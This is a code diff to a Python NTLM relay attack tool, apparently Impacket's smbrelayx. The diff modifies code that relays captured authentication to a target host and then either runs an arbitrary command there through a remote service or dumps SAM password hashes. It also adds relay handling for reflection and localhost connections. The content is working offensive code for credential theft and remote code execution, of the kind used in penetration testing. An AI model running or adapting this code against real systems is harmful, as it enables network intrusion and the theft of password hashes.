@@ -86,7 +86,6 @@ class doAttack(Thread):
         else:
             from secretsdump import RemoteOperations, SAMHashes
             samHashes = None
-            remoteOps = None
             try:
                 # We have to add some flags just in case the original client did not
                 # Why? needed for avoiding INVALID_PARAMETER
@@ -96,6 +95,12 @@ class doAttack(Thread):
 
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
+            except Exception, e:
+                # Something wen't wrong, most probably we don't have access as admin. aborting
+                logging.error(str(e))
+                return
+
+            try:
                 if self.__command is not None:
                     remoteOps._RemoteOperations__executeRemote(self.__command)
                     logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
@@ -105,6 +110,7 @@ class doAttack(Thread):
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                 else:
                     bootKey = remoteOps.getBootKey()
+                    remoteOps._RemoteOperations__serviceDeleted = True
                     samFileName = remoteOps.saveSAM()
                     samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                     samHashes.dump()
@@ -409,7 +415,10 @@ class HTTPRelayServer(Thread):
             self.machineAccount = None
             self.machineHashes = None
             self.domainIp = None
-            logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target))
+            if self.server.target is not None:
+                logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target))
+            else:
+                logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,client_address[0]))
             SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
 
         def handle_one_request(self):
@@ -451,7 +460,6 @@ class HTTPRelayServer(Thread):
             if messageType == 1:
                 if self.server.mode.upper() == 'REFLECTION':
                     self.target = self.client_address[0]
-                    logging.info("Downgrading to standard security")
                 else:
                     self.target = self.server.target
                 try:
@@ -469,12 +477,13 @@ class HTTPRelayServer(Thread):
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
-                if authenticateMessage['user_name'] != '':
+                if authenticateMessage['user_name'] != '' or self.target == '127.0.0.1':
                     respToken2 = SPNEGO_NegTokenResp()
                     respToken2['ResponseToken'] = str(token)
                     clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'], respToken2.getData())
                 else:
-                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
+                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
+                    # when coming from localhost
                     errorCode = STATUS_ACCESS_DENIED
 
                 if errorCode != STATUS_SUCCESS:
@@ -853,10 +862,6 @@ if __name__ == '__main__':
     parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
-
-    if len(sys.argv)==1:
-        parser.print_help()
-        sys.exit(1)
 
     try:
        options = parser.parse_args()
